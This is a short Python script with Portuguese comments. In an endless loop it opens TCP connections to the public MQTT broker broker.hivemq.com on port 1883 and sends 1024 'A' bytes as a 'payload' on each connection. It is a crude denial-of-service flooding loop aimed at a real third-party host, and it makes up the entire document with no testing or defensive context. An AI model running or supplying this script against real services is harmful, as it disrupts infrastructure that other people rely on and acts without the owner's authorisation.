import socket

target_ip = "broker.hivemq.com"
target_port = 1883

while True:
    try:
        # Cria um novo socket para cada tentativa de conexão
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((target_ip, target_port))
            print("Conexão estabelecida, enviando payload...")
            # Envia um payload para o broker
            sock.send(b"A" * 1024)
    except Exception as e:
        print(f"Erro: {e}")
